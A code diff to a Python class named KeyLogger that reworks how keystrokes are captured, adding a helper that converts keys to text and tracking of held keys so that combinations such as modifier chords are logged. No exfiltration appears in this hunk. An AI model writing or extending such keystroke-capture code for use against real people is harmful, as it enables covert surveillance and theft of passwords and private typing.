@@ -33,34 +33,39 @@ class KeyLogger:
     
     # Taking keyboard input
     # -------------------------------------------
+    def key_to_str(self, key):
+        # if normal key is present return the same
+        try:
+            return key.char
+        except AttributeError:
+            # for special keys 
+            return key.name.upper() if hasattr(key, "name") else str(key)
+    
+    
     # a callback to for each key pressed
     def key_press(self, key):
         
         # check for kill switch 
         self.check_file()
         
-        try:
-            self.log += key.char
-        except AttributeError:
-            if key == Key.space:
-                self.log += " "
-            elif key == Key.backspace:
-                self.log += "[BACKSPACE]"
-            elif key == Key.enter:
-                self.log += "[ENTER]\n"
-            elif key in (Key.shift_l, Key.shift_r):
-                self.log += "[SHIFT]"
-            elif key in (Key.alt_l, Key.alt_r):
-                self.log += "[ALT]"
-            elif key in (Key.ctrl_l, Key.ctrl_r):
-                self.log += "[CTRL]"
-            else:
-                self.log += f"{key}"
-    
+        # for currently pressed keys 
+        self.pressed_keys.add(key)
+        
+        if len(self.pressed_keys) == 1:
+            self.log += self.key_to_str(key)
+        
+        # only for combinations 
+        if len(self.pressed_keys) > 1:
+            combo = "+".join(self.key_to_str(k) for k in self.pressed_keys)
+            self.log += combo
+
+
     # on release function   
     def key_release(self, key):
         # check for kill switch 
         self.check_file()
+        if key in self.pressed_keys:
+            self.pressed_keys.remove(key)
         
         if key == Key.esc:
             if self.M_Listener:
